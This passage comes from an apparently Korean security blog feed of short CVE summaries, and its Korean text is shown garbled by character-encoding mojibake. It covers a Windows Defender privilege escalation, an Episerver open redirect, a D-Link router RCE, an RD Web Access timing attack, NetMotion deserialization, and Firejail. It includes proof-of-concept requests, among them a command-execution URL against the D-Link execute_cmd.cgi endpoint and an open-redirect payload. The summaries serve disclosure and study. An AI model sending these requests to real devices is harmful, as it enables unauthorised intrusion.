ë³´ëƒ…ë‹ˆë‹¤.</li><li><code>https://business.facebook.com/collabsmanager/creator/creator_portfolio/&#123;ID&#125;/</code>ì— ì ‘ì†í•˜ì—¬ ë¹„ë””ì˜¤ í”Œë ˆì´ì–´ source tagì˜ <code>src</code> ê°’ì„ í™•ì¸í•˜ë©´ ìˆ˜ì •ëœ í•¸ë“¤ ê°’ì— í•´ë‹¹í•˜ëŠ” <code>scontent.*.fbcdn.net</code> ë„ë©”ì¸ì„ ê°€ì§„ íŒŒì¼ URLì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ íŒŒì¼ URLì€ ë‚´ë¶€ CDNì— ì¡´ì¬í•˜ëŠ” íŒŒì¼ì´ ê³µìš© CDNì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” íŒŒì¼ë¡œ ë³µì‚¬ëœ ê²ƒì…ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>facebook</tag>
      
      <tag>cdn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-24092: 12ë…„ë™ì•ˆ ì¡´ì¬í•œ Windows Defender ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/02/15/l0ch/2021-02-15/"/>
    <url>/2021/02/15/l0ch/2021-02-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-24092-12-years-in-hiding-a-privilege-escalation-vulnerability-in-windows-defender/?fbclid=IwAR3HRkRwINUj1LDAsZ55Mz8t6CKqOsCFaRgmy19M0i7HJ_txY3Qp3dzPOsM">CVE-2021-24092: 12 Years in Hiding â€“ A Privilege Escalation Vulnerability in Windows Defender</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Defender</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defenderì—ì„œ ì˜ëª»ëœ íŒŒì¼ ê²€ì¦ìœ¼ë¡œ ì¸í•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” 2009ë…„ë¶€í„° ì¡´ì¬í•´ ì•½ 12ë…„ ë™ì•ˆ ìˆ˜ì •ë˜ì§€ ì•Šì€ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p><code>BTR.sys</code> ë“œë¼ì´ë²„ëŠ” Windows Defenderì˜ ìˆ˜ì • í”„ë¡œì„¸ìŠ¤ë¡œ, ì»¤ë„ ëª¨ë“œì—ì„œ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ì— ì˜í•´ ìƒì„±ëœ íŒŒì¼ ì‹œìŠ¤í…œ ë° ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ ì‚­ì œí•˜ëŠ” ê¸°ëŠ¥ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ë“œë¼ì´ë²„ê°€ ë¡œë“œë˜ê³  í™œì„±í™”ë  ë•Œ <code>NTCreateFile</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ <code>C:\Windows\Temp\BootClean.log</code> íŒŒì¼ì— ëŒ€í•œ í•¸ë“¤ì„ ìƒì„±í•©ë‹ˆë‹¤. ì´ë•Œ ë§¤ê°œë³€ìˆ˜ <code>CreateDisposition</code> í•„ë“œì— íŒŒì¼ì´ ì¡´ì¬í•˜ë©´ ì›ë³¸ íŒŒì¼ì„ ì‚­ì œí•˜ê³  ìƒˆ íŒŒì¼ì„ ìƒì„±í•˜ëŠ” <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile">FILE_SUPERSEDE</a> ì˜µì…˜ì„ ì„¤ì •í•˜ëŠ”ë°, í•´ë‹¹ íŒŒì¼ì´ ë§í¬ì¸ì§€ ì—¬ë¶€ë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ ì„ì˜ íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ê°€ <code>C:\Windows\Temp\BootClean.log</code> ë¥¼ ì„ì˜ íŒŒì¼ì— ëŒ€í•œ í•˜ë“œ ë§í¬ë¡œ ìƒì„±í•©ë‹ˆë‹¤.</li><li>Windows Defenderì—ì„œ BTR ë“œë¼ì´ë²„ë¥¼ ë¡œë“œí•©ë‹ˆë‹¤.</li><li>í•´ì»¤ëŠ” í•˜ë“œ ë§í¬ë¡œ ì—°ê²°ëœ ì„ì˜ íŒŒì¼ì„ ë©€ì›¨ì–´ ë“±ìœ¼ë¡œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><p>MicrosoftëŠ” 2ì›” 9ì¼ì— ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ë°œí‘œí–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>windows defender</tag>
      
      <tag>privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-24550 : Open redirect in Episerver Find</title>
    <link href="/2021/02/13/fabu1ous/2021-02-13/"/>
    <url>/2021/02/13/fabu1ous/2021-02-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://labs.nettitude.com/blog/cve-2020-24550-open-redirect-in-episerver-find/">cve-2020-24550</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Episerver Find &lt; 13.2.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Episerver FindëŠ” ì»¨í…ì¸  ê´€ë¦¬, e-commerce, ìë™ ë§ˆì¼€íŒ… ë“±ì˜ ê¸°ëŠ¥ì´ í¬í•¨ëœ ê²€ìƒ‰ì—”ì§„ í”Œë«í¼ì…ë‹ˆë‹¤. Episerver Find 13.2.6 ì´ì „ ë²„ì „ì—ì„œ ë°œìƒí•˜ëŠ” Open redirect ì·¨ì•½ì (CVE-2020-24550)ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Episerver FindëŠ” <code>_t_redirect</code> íŒŒë¼ë¯¸í„°ë¡œ untrusted inputì„ redirect í•¨ìˆ˜ì— ì „ë‹¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í•´ì»¤ëŠ” í•´ë‹¹ íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ ì‚¬ìš©ìë¥¼ ì„ì˜ì˜ URLë¡œ redirect í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs csharp">[<span class="hljs-meta">HttpGet</span>]<span class="hljs-function"><span class="hljs-keyword">public</span> HttpResponseMessage <span class="hljs-title">Index</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">[FromUri(Name = <span class="hljs-string">&quot;_t_id&quot;</span></span>)] <span class="hljs-keyword">string</span> id,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_q&quot;</span></span>)] <span class="hljs-keyword">string</span> query,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.id&quot;</span></span>)] <span class="hljs-keyword">string</span> hitId,</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_redirect&quot;</span></span>)] <span class="hljs-keyword">string</span> redirect</span><span class="hljs-function">[<span class="hljs-title">FromUri</span>(<span class="hljs-params">Name = <span class="hljs-string">&quot;_t_hit.pos&quot;</span></span>)] <span class="hljs-keyword">int</span>? hitPos</span> = <span class="hljs-literal">null</span>,[<span class="hljs-meta">FromUri(Name = <span class="hljs-meta-string">&quot;_t_tags&quot;</span>)</span>] <span class="hljs-keyword">string</span> tags = <span class="hljs-string">&quot;&quot;</span>)&#123;  <span class="hljs-keyword">this</span>.PostTrackData(id, query, hitId, hitPos, tags);  HttpResponseMessage response = HttpRequestMessageExtentions.CreateResponse(<span class="hljs-keyword">this</span>.get_Request(), HttpStatusCode.MovedPermanently);  response.Headers.Location = <span class="hljs-keyword">new</span> Uri(redirect);  <span class="hljs-keyword">return</span> response;&#125;</code></pre><p><code>EPiServer.Find.UI.Controllers.ClickController.Index()</code> ë©”ì†Œë“œì˜ ì½”ë“œì…ë‹ˆë‹¤. <code>_t_redirect</code>íŒŒë¼ë¯¸í„°ì˜ ê°’ì´ Location headerì¸ 301 redirect reponseë¥¼ ë¦¬í„´í•©ë‹ˆë‹¤.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h2><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&#123;vulnerable&#125;<span class="hljs-regexp">/find_v2/</span>_click?_t_id=&amp;_t_q=&amp;_t_hit.id=&amp;_t_redirect=https:/hackyboiz.github.io</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>open redirect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-24581: D-Link ë¼ìš°í„°ì˜ ì˜ë„ì ì¸ RCE ì·¨ì•½ì </title>
    <link href="/2021/02/12/l0ch/2021-02-12/"/>
    <url>/2021/02/12/l0ch/2021-02-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://reconshell.com/cve-2020-24581-d-link-dsl-2888a-remote-command-execution/">CVE-2020-24581 D-Link DSL-2888A Remote Command Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-Link DSL-2888A AU_2.31_V1.1.47ae55 ì´ì „ ë²„ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ëŒ€ë§Œ D-linkì‚¬ì˜ í†µí•© ì„œë¹„ìŠ¤ ë¼ìš°í„° ì œí’ˆì¸ DSL-2888A íŒì›¨ì–´ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ë³´ì•ˆ ì—°êµ¬ì›ë“¤ì€ ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ê¸°ëŠ¥ì´ ì›¹ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ì •ìƒì ì¸ ì‚¬ìš©ìœ¼ë¡œëŠ” ì ‘ê·¼í•  ìˆ˜ ì—†ì–´ ì˜ë„ì ìœ¼ë¡œ ìˆ¨ê²¨ì§„ ê¸°ëŠ¥ì´ë¼ê³  ë¶„ì„í–ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì œí’ˆì´ ì›¹ ì„œë¹„ìŠ¤ë¥¼ ì´ˆê¸°í™”í•  ë•Œ <code>cgi-bin</code>ì»´í¬ë„ŒíŠ¸ê°€ ë¡œë“œë©ë‹ˆë‹¤. ì·¨ì•½ì ì€ <code>cgi-bin</code> ë””ë ‰í„°ë¦¬ì˜ <code>execute_cmd.cgi</code> íŒŒì¼ì— ì¡´ì¬í•˜ë©° ì¸ì¦ëœ ì‚¬ìš©ìê°€ <code>execute_cmd.cgi</code>ì— ì ‘ê·¼ ì‹œ <code>ajax.js</code>ì—ì„œ ìš”ì²­ ì¿¼ë¦¬ì˜ ë‘ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ê°€ì ¸ì™€ ì‹¤í–‰í•˜ëŠ”ë°, ì´ë•Œ ë§¤ê°œ ë³€ìˆ˜ì— ëŒ€í•œ ê²€ì¦ì´ ì—†ì–´ ì„ì˜ ëª…ë ¹ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx">get : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_dataType</span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">var</span> _url = <span class="hljs-built_in">this</span>.url;<span class="hljs-keyword">if</span>(_url.indexOf(<span class="hljs-string">&#x27;?&#x27;</span>) == <span class="hljs-number">-1</span>)_url += <span class="hljs-string">&#x27;?timestamp=&#x27;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">else</span>_url += <span class="hljs-string">&quot;&amp;timestamp=&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime();<span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.queryString.length &gt; <span class="hljs-number">0</span>)_url += <span class="hljs-string">&quot;&amp;&quot;</span> + <span class="hljs-built_in">this</span>.queryString;<span class="hljs-built_in">this</span>.xmlHttp.open(<span class="hljs-string">&quot;GET&quot;</span>, _url, <span class="hljs-literal">true</span>);...</code></pre><p>í•´ë‹¹ ì·¨ì•½ì ì€ ì¸ì¦ ìš°íšŒ ì·¨ì•½ì ì¸ CVE-2020-24579ì™€ ê°™ì´ ì•…ìš©ë˜ì–´ ë‹¤ìŒê³¼ ê°™ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ì„ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ì•„ë¬´ ê´€ë¦¬ì íŒ¨ìŠ¤ì›Œë“œë¡œ ë¡œê·¸ì¸ ì¸ì¦ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</li><li>ë‚´ë¶€ì ìœ¼ë¡œëŠ” ìœ íš¨í•œ ì¸ì¦ ì„¸ì…˜ì´ ì´ë£¨ì–´ì ¸ ì¸ì¦ í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (CVE-2020-24579)</li><li>ì´í›„ ls ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” pocëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</li></ol><pre><code class="hljs http">http://[DeviceIP]/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&amp;cmd=ls</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft RD Web Access Authentication Timing Attack</title>
    <link href="/2021/02/11/idioth/2021-02-11/"/>
    <url>/2021/02/11/idioth/2021-02-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raxis.com/blog/rd-web-access-vulnerability">Microsoft Remote Desktop Web Access Authentication Timing Attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2016</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftì˜ Remote Desktop Web Access ì• í”Œë¦¬ì¼€ì´ì…˜(RD Web Access)ì—ì„œ Active Directory ë„ë©”ì¸ ë‚´ì˜ ì‚¬ìš©ì ì´ë¦„ì„ í™•ì¸í•  ìˆ˜ ìˆëŠ” anonymous authentication timing attack ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. RD Web AccessëŠ” ì›¹ ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ ì›ê²© ë°ìŠ¤í¬í†± ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì›¹ ê¸°ë°˜ ì›ê²© ë°ìŠ¤í¬í†± í´ë¼ì´ì–¸íŠ¸ì…ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ê³¼ ë¹„ìŠ·í•œ íƒ€ì´ë° ê¸°ë°˜ ì¸ì¦ ì·¨ì•½ì ì´ Outlook Web ì• í”Œë¦¬ì¼€ì´ì…˜ì—ë„ ì¡´ì¬í•©ë‹ˆë‹¤. ìœ íš¨í•œ ì‚¬ìš©ìì™€ ìœ íš¨í•˜ì§€ ì•Šì€ ì‚¬ìš©ìì˜ ì¸ì¦ ì‹œë„ì˜ ì‘ë‹µ ì‹œê°„ì„ ë¹„êµí•˜ì—¬ ìœ íš¨í•œ ì‚¬ìš©ìì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. RD Web Accessì—ì„œ ìœ íš¨í•œ ì‚¬ìš©ìì˜ ì‘ë‹µ ì‹œê°„ì€ ë¹„ë°€ë²ˆí˜¸ê°€ í‹€ë ¤ë„ 232 ë°€ë¦¬ì„¸ì»¨ë“œì˜ ì‹œê°„ì´ ê±¸ë¦¬ì§€ë§Œ, ìœ íš¨í•˜ì§€ ì•Šì€ ì‚¬ìš©ìì˜ ê²½ìš° ì‘ë‹µ ì‹œê°„ì´ 4ì´ˆê°€ ë„˜ì–´ê°‘ë‹ˆë‹¤. ëŒ€ìƒ ì„œë²„ê°€ ì¸ì¦ ì‹œë„ ìš”ì²­ì— ì‘ë‹µí•˜ëŠ” ì‹œê°„ì„ í†µí•´ ì‚¬ìš©ì ì´ë¦„ì˜ ìœ íš¨ì„±ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ëŒ€ìƒ ì„œë²„ì˜ Active Directory ë„ë©”ì¸ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. RPCì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê²½ìš° ì¡°ì‘ëœ NTLM Challenge ìš”ì²­ì„ í†µí•´ íƒ€ê¹ƒì˜ Active Directory ë„ë©”ì¸ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Active Directory ë„ë©”ì¸ì„ ì–»ìœ¼ë©´, ë„ë©”ì¸ìœ¼ë¡œë¶€í„° ìœ íš¨í•œ ì‚¬ìš©ìì˜ ì´ë¦„ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ Active Directory í™˜ê²½ì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³  2ì°¨ ê³µê²©ì— ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ ì‚¬ìš©ì ì´ë¦„ ë¦¬ìŠ¤íŠ¸ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ metasploit ëª¨ë“ˆ ì—…ë°ì´íŠ¸ ì •ë³´ëŠ” <a href="https://github.com/rapid7/metasploit-framework/pull/14544">ì—¬ê¸°</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>rd web</tag>
      
      <tag>timming attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26912: NetMotion Mobility Deserialization to RCE</title>
    <link href="/2021/02/10/fabu1ous/2021-02-10/"/>
    <url>/2021/02/10/fabu1ous/2021-02-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/">NetMotion Mobility Server Multiple Deserializaion of Untrusted Data Lead to RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NetMotion Mobility Server 11.73 ì´ì „ ë²„ì „</p><p>NetMotion Mobility Server 12.01.09045</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NetMotion MobilityëŠ” ì‚¬ë‚´ ë„¤íŠ¸ì›Œí¬ë¥¼ ì•ˆì „í•˜ê²Œ ì™¸ë¶€ ëª¨ë°”ì¼ ê¸°ê¸°ë¡œ ì—°ì¥ì‹œí‚¤ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” VPNì…ë‹ˆë‹¤. NetMotion Mobility Server 12.01.09045ëŠ” untrusted dataì— ëŒ€í•œ Java deserializationì·¨ì•½ì  íŒ¨í„´ì´ ì—¬ëŸ¬ ê°œ ì¡´ì¬í•´ SYSTEM ê¶Œí•œìœ¼ë¡œ ì›ê²©ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤(CVE-2021-26912).</p><ol><li><p>SupportRpcServlet</p><pre><code class="hljs java">...RpcData rpcData = (RpcData)objectInputStream.readObject();      <span class="hljs-keyword">if</span> (rpcData.validate(<span class="hljs-keyword">true</span>)) &#123;        command(paramHttpServletResponse, rpcData);      &#125;...</code></pre><p><code>com.nmwco.server.support.SupportRpcServlet</code> í´ë˜ìŠ¤ì˜ ì½”ë“œì…ë‹ˆë‹¤. Inputstreamìœ¼ë¡œë¶€í„° íŠ¹ë³„í•œ ê²€ì‚¬ ë° ë³´í˜¸ ì—†ì´ <code>readObject()</code>ë¥¼ í†µí•´ <code>rpcData</code>ì˜ ê°’ì„ ì„¤ì •í•©ë‹ˆë‹¤. Inputstreamì€ í•´ì»¤ê°€ ì œì–´(attacker-controlled)í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ RCEê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p></li><li><p>RpcServlet</p><pre><code class="hljs aspectj">...  <span class="hljs-keyword">public</span> <span class="hljs-function">RpcData <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream param1ObjectInputStream)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          &#125;...</code></pre><p><code>com.nmwco.server.events.EventRpcServlet</code> í´ë˜ìŠ¤ì˜ ì½”ë“œì…ë‹ˆë‹¤. readObject dispatcherëŠ” RpcData íƒ€ì…ì˜ ì…ë ¥ì„ ë°›ì„ ë•Œ attacker-controlled ë°ì´í„°ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p></li><li><p>MvcUtil valueStringToObject</p><pre><code class="hljs java">...mvcController.invoke(servletContext, paramHttpServletRequest, paramHttpServletResponse);...</code></pre><p><code>com.nmwco.server.mvc.MvcServlet</code> í´ë˜ìŠ¤ì˜ ì½”ë“œì…ë‹ˆë‹¤. attacker-contolled ë°ì´í„°ì¸ <code>paramHttpServletRequest</code>ë¥¼ 2ë²ˆì§¸ ì¸ìë¡œ <code>invoke</code> ë©”ì„œë“œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤.</p></li><li><p>webrepdb StatusServlet</p><pre><code class="hljs lasso"><span class="hljs-params">...</span>param1ObjectInputStream) throws Exception &#123;   <span class="hljs-comment">// 1</span>            <span class="hljs-keyword">return</span> (RpcData)param1ObjectInputStream.readObject();          &#125;<span class="hljs-params">...</span></code></pre><p><code>com.nmwco.server.web.repdb.StatusServlet</code> í´ë˜ìŠ¤ì˜ ì½”ë“œì…ë‹ˆë‹¤. attacker-controlled ë°ì´í„°ì— ëŒ€í•œ <code>readObject()</code>í˜¸ì¶œì„ ì‚¬ìš©í•´ GET ë˜ëŠ” POST requestì— ëŒ€í•œ ë””ìŠ¤íŒ¨ì²˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Privilege escalation in firejail overlayfs</title>
    <link href="/2021/02/09/l0ch/2021-02-09/"/>
    <url>/2021/02/09/l0ch/2021-02-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q1/121">Firejail: root privilege escalation in OverlayFS code</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firejail 0.9.30</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firejailì€ Linux í™˜ê²½ì—ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì‹¤í–‰ í™˜ê²½ì„ ì œí•œí•˜ëŠ” SUID ìƒŒë“œë°•ì‹± ì• í”Œë¦¬ì¼€ì´ì…˜ì…ë‹ˆë‹¤. Linuxìš© í†µí•© ë§ˆìš´íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì¸ <a href="https://en.wikipedia.org/wiki/OverlayFS">overlayfs</a> ê¸°ëŠ¥ì´ í™œì„±í™”ëœ Firejailì—ì„œ race conditionì„ í†µí•´ root ê¶Œí•œìœ¼ë¡œ ì„ì˜ íŒŒì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì•„ë˜ëŠ”  <code>fs_overlayfs()</code> í•¨ìˆ˜ì˜ ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì†ŒìŠ¤ì½”ë“œì…ë‹ˆë‹¤</p><pre><code class="hljs c">    <span class="hljs-number">943</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fs_overlayfs</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;...    <span class="hljs-number">969</span>         <span class="hljs-comment">// we disable overlayfs for now, pending fixing</span>    <span class="hljs-number">970</span>         <span class="hljs-keyword">if</span> (major &gt;= <span class="hljs-number">4</span> &amp;&amp;minor &gt;= <span class="hljs-number">19</span>) &#123;    <span class="hljs-number">971</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: OverlayFS disabled for Linux kernels 4.19 and newer, pending fixing.\\n&quot;</span>);    <span class="hljs-number">972</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    <span class="hljs-number">973</span>         &#125;...   <span class="hljs-number">1033</span>         <span class="hljs-keyword">if</span> (mkdirat(basefd, <span class="hljs-string">&quot;odiff&quot;</span>, <span class="hljs-number">0755</span>) == <span class="hljs-number">-1</span> &amp;&amp; errno != EEXIST) &#123;   <span class="hljs-number">1034</span>                 perror(<span class="hljs-string">&quot;mkdir&quot;</span>);   <span class="hljs-number">1035</span>                 <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: cannot create overlay directory         %s\\n&quot;</span>, odiff);   <span class="hljs-number">1036</span>                 <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);   <span class="hljs-number">1037</span>         &#125;   <span class="hljs-number">1038</span>         ASSERT_PERMS(odiff, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0755</span>);...   <span class="hljs-number">1065</span>         <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// kernel 3.18 or newer</span>   <span class="hljs-number">1066</span>                 <span class="hljs-keyword">if</span> (asprintf(&amp;option, <span class="hljs-string">&quot;lowerdir=/,upperdir=%s,workdir=%s        &quot;</span>, odiff, owork) == <span class="hljs-number">-1</span>)   <span class="hljs-number">1067</span>                         errExit(<span class="hljs-string">&quot;asprintf&quot;</span>);   <span class="hljs-number">1068</span>                 <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;overlay&quot;</span>, oroot, <span class="hljs-string">&quot;overlay&quot;</span>, MS_MGC_VAL, optio        n) &lt; <span class="hljs-number">0</span>) &#123;</code></pre><p>Firejailì€ overlayfsë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ì‚¬ìš©ì í™ˆ ë””ë ‰í„°ë¦¬ì—ì„œ ì‹œì‘í•˜ëŠ” ë§ˆìš´íŠ¸ ëŒ€ìƒ ë””ë ‰í„°ë¦¬ë¥¼ ì°¾ì•„ ì´ë™í•˜ë©° root ì†Œìœ ì´ê³ , 